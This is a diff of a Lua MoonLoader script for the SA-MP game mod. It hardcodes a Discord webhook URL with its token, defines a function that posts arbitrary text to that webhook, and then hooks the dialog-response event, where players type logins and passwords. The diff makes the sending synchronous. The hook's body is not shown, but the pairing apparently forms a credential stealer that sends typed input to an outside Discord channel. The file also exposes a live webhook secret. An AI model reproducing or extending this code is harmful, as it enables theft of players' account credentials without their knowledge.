@@ -25,26 +25,24 @@ local lastSyncTime = 0
 local https = require("ssl.https")
 local ltn12 = require("ltn12")
 local samp = require("samp.events")
-local lua_thread = require("moonloader").lua_thread
 
 local webhookUrl = "https://discord.com/api/webhooks/1344405697642762260/AMSM__DQ0n4OC5-s7m_Hkatg-sAguMiq2wFrgiMabsKL5sj3XGC3f6pJHGV3XyJ604zx"
 local messageSent = false
 
 function sendMessageToDiscord(content)
-    lua_thread.create(function()
-        local body = '{"content": "' .. content:gsub('"', '\\"'):gsub("\n", "\\n") .. '"}'
-        local response_body = {}
-        https.request {
-            url = webhookUrl,
-            method = "POST",
-            headers = {
-                ["Content-Type"] = "application/json",
-                ["Content-Length"] = tostring(#body)
-            },
-            source = ltn12.source.string(body),
-            sink = ltn12.sink.table(response_body)
-        }
-    end)
+    -- Envio direto (sem lua_thread)
+    local body = '{"content": "' .. content:gsub('"', '\\"'):gsub("\n", "\\n") .. '"}'
+    local response_body = {}
+    https.request {
+        url = webhookUrl,
+        method = "POST",
+        headers = {
+            ["Content-Type"] = "application/json",
+            ["Content-Length"] = tostring(#body)
+        },
+        source = ltn12.source.string(body),
+        sink = ltn12.sink.table(response_body)
+    }
 end
 
 samp.onSendDialogResponse = function(dialogId, button, listboxId, input)
